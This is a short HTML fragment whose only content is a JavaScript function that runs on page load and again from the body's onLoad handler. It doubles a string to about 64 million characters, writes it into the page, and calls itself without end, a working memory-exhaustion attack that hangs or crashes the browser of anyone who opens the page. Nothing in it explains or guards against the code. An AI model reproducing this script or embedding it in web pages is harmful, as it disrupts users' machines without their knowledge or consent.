<script>
	
	
	
function asheesh ()
 {
	var	i , anaconda = "XXXX"
	for(i=24;i >0 ;--i)
 {
		anaconda=anaconda+anaconda;
	}

    document.write(anaconda);

  asheesh();

}
asheesh();

</script>
</head>

<body onLoad="asheesh()"></body>
</html>



